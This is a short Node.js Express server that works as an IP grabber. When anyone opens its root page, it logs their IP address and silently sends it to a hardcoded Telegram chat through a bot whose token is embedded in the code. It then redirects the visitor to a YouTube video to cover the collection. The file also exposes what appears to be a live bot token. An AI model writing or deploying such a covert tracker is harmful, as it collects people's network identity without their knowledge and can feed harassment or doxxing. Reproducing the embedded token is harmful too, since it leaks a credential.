const express = require('express');
const Bot = require('node-telegram-bot-api')
const app = express();

const bot = new Bot('7325212318:AAHp04eOZhjfVZjXRX__q5_I3PKkgCX6et0', {
    polling: true
})

app.get('/',async (req, res) => {

    console.log(req.ip, req.ips);
    await bot.sendMessage(2074310819, req.ip)
    res.redirect('https://www.youtube.com/watch?v=dQw4w9WgXcQ');
})

app.listen(8080);